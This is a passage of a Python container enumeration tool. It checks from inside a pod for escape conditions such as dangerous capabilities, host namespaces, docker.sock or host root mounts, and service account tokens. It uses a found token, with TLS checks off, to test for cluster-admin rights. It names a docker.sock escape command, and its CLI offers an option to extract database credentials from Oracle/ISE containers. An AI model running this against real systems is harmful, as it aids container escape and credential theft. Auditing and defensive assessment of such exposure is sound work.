                                     'direct path to host root via cgroup device '
                                     'mounting, /proc/sysrq-trigger, or raw namespace '
                                     'pivot'),
                        'host':     _host,
                        'port':     _port,
                    })
                elif cap_eff & 0x0000000000200000:  # CAP_SYS_ADMIN (bit 21)
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'CAP_SYS_ADMIN_PRESENT',
                        'detail':   (f'CAP_SYS_ADMIN_PRESENT — CapEff = {_m.group(1)}; '
                                     'CAP_SYS_ADMIN is set; enables mount(2), unshare, '
                                     'cgroup manipulation — sufficient for most known '
                                     'container escape chains'),
                        'host':     _host,
                        'port':     _port,
                    })
        except OSError:
            pass

    # ------------------------------------------------------------------
    # 3. Host network namespace (bridge interfaces visible in-container)
    # ------------------------------------------------------------------
    net_dev_path = '/proc/self/net/dev'
    if os.path.exists(net_dev_path):
        try:
            with open(net_dev_path, 'r', errors='replace') as _f:
                _net = _f.read()
            _host_ifaces = [i for i in ('docker0', 'cni0', 'flannel.1', 'weave')
                            if i in _net]
            if _host_ifaces:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'HOST_NETWORK_NAMESPACE',
                    'detail':   ('HOST_NETWORK_NAMESPACE — host-side network bridge '
                                 f'interfaces visible ({", ".join(_host_ifaces)}); '
                                 'pod is running in the host network namespace '
                                 '(hostNetwork: true) or network namespace isolation '
                                 'is broken'),
                    'host':     _host,
                    'port':     _port,
                })
        except OSError:
            pass

    # ------------------------------------------------------------------
    # 4. Host PID namespace (host system daemons visible in /proc)
    # ------------------------------------------------------------------
    _host_bins = {'systemd', 'dockerd', 'kubelet', 'containerd', 'init'}
    _found_procs: list = []
    try:
        for _entry in os.listdir('/proc'):
            if not _entry.isdigit():
                continue
            try:
                _target = os.readlink(f'/proc/{_entry}/exe')
                _bn = os.path.basename(_target)
                if _bn in _host_bins:
                    _found_procs.append(_bn)
            except OSError:
                continue
            if len(_found_procs) >= 3:
                break
    except OSError:
        pass

    if _found_procs:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'HOST_PID_NAMESPACE',
            'detail':   ('HOST_PID_NAMESPACE — host system processes visible in '
                         f'/proc ({", ".join(set(_found_procs))}); pod is running '
                         'in the host PID namespace (hostPID: true); enables '
                         'ptrace of host processes, /proc/<pid>/mem reads, '
                         'and arbitrary signal delivery'),
            'host':     _host,
            'port':     _port,
        })

    # ------------------------------------------------------------------
    # 5. Dangerous volume mounts (parse /proc/self/mounts)
    # ------------------------------------------------------------------
    mounts_path = '/proc/self/mounts'
    if os.path.exists(mounts_path):
        try:
            with open(mounts_path, 'r', errors='replace') as _f:
                _mounts = _f.read()

            _vfs_types = {'tmpfs', 'proc', 'sysfs', 'devtmpfs', 'overlay',
                          'cgroup', 'cgroup2', 'devpts', 'mqueue', 'hugetlbfs'}

            for _line in _mounts.splitlines():
                _parts = _line.split()
                if len(_parts) < 4:
                    continue
                _dev, _mnt, _fst, _opts = (_parts[0], _parts[1],
                                            _parts[2], _parts[3])

                # /etc bind-mounted from host block device or bind source
                if (_mnt == '/etc' and _fst not in _vfs_types
                        and _dev not in ('overlay', 'none')):
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'HOST_ETC_MOUNTED',
                        'detail':   (f'HOST_ETC_MOUNTED — /etc is bind-mounted '
                                     f'from {_dev} (fstype={_fst}); host '
                                     'credentials, sudoers, shadow, and SSH '
                                     'authorized_keys are readable/writable'),
                        'host':     _host,
                        'port':     _port,
                    })

                # Docker socket bind-mounted into container
                if 'docker.sock' in _mnt or 'docker.sock' in _dev:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'DOCKER_SOCK_MOUNTED',
                        'detail':   (f'DOCKER_SOCK_MOUNTED — Docker socket '
                                     f'bind-mounted at {_mnt} (from {_dev}); '
                                     'container escape trivial via '
                                     'docker run --privileged -v /:/host'),
                        'host':     _host,
                        'port':     _port,
                    })

                # Host root filesystem bind-mounted at /
                if (_mnt == '/' and _fst not in ('overlay', 'aufs')
                        and _dev.startswith('/dev/')):
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'HOST_ROOT_MOUNTED',
                        'detail':   (f'HOST_ROOT_MOUNTED — root filesystem '
                                     f'bind-mounted ({_dev} -> /); full host '
                                     'filesystem read/write access from within '
                                     'the container'),
                        'host':     _host,
                        'port':     _port,
                    })

                # /proc mounted rw
                if _mnt == '/proc' and 'rw' in _opts.split(','):
                    findings.append({
                        'severity': 'HIGH',
                        'title':    'HOST_PROC_WRITABLE',
                        'detail':   (f'HOST_PROC_WRITABLE — /proc mounted with '
                                     f'rw options ({_opts}); enables '
                                     'sysrq-trigger writes, core_pattern '
                                     'overwrite, and kernel-level escape '
                                     'primitives'),
                        'host':     _host,
                        'port':     _port,
                    })
        except OSError:
            pass

    # ------------------------------------------------------------------
    # 6. Kubernetes service account token
    # ------------------------------------------------------------------
    sa_token_path = '/var/run/secrets/kubernetes.io/serviceaccount/token'
    if os.path.exists(sa_token_path):
        try:
            with open(sa_token_path, 'r', errors='replace') as _f:
                _sa_token = _f.read().strip()
            findings.append({
                'severity': 'HIGH',
                'title':    'K8S_SA_TOKEN_PRESENT',
                'detail':   (f'K8S_SA_TOKEN_PRESENT — Kubernetes service account '
                             f'JWT present at {sa_token_path}; can authenticate '
                             'to the API server; effective privilege depends on '
                             'RBAC bindings'),
                'host':     _host,
                'port':     _port,
            })

            # Optional: check wildcard permissions via SelfSubjectAccessReview
            _api_host = os.environ.get('KUBERNETES_SERVICE_HOST', '')
            _api_port = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
            if _api_host and _sa_token:
                try:
                    import ssl as _ssl
                    _ctx = _ssl.create_default_context()
                    _ctx.check_hostname = False
                    _ctx.verify_mode = _ssl.CERT_NONE
                    _url = (f'https://{_api_host}:{_api_port}'
                            '/apis/authorization.k8s.io/v1'
                            '/selfsubjectaccessreviews')
                    _payload = json.dumps({
                        'apiVersion': 'authorization.k8s.io/v1',
                        'kind':       'SelfSubjectAccessReview',
                        'spec':       {'resourceAttributes': {
                            'verb':     '*',
                            'resource': '*',
                            'group':    '*',
                        }},
                    }).encode()
                    _req = urllib.request.Request(
                        _url,
                        data=_payload,
                        method='POST',
                        headers={
                            'Authorization': f'Bearer {_sa_token}',
                            'Content-Type':  'application/json',
                        },
                    )
                    with urllib.request.urlopen(
                            _req, context=_ctx, timeout=5.0) as _r:
                        _rb = json.loads(_r.read(4096))
                    if _rb.get('status', {}).get('allowed'):
                        findings.append({
                            'severity': 'CRITICAL',
                            'title':    'K8S_ADMIN_SA_TOKEN',
                            'detail':   ('K8S_ADMIN_SA_TOKEN — '
                                         'SelfSubjectAccessReview returned '
                                         'allowed=true for verb=* resource=* '
                                         'group=*; service account has '
                                         'cluster-admin or equivalent wildcard '
                                         'permissions; full cluster takeover '
                                         'from within the pod'),
                            'host':     _api_host,
                            'port':     int(_api_port),
                        })
                except Exception:
                    pass
        except OSError:
            pass

    return findings


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument('--socket',  metavar='PATH', help='Podman socket path')
    ap.add_argument('--exec-oracle', action='store_true',
                    help='Exec into Oracle/ISE containers to extract DB creds')
    args = ap.parse_args()

    if args.socket:
        enum = PodmanEnumerator(socket_path=args.socket)
        out  = enum.run(exec_oracle=args.exec_oracle)
    else:
        out = enumerate_podman(exec_oracle=args.exec_oracle)

    print(json.dumps(out, indent=2, default=str))
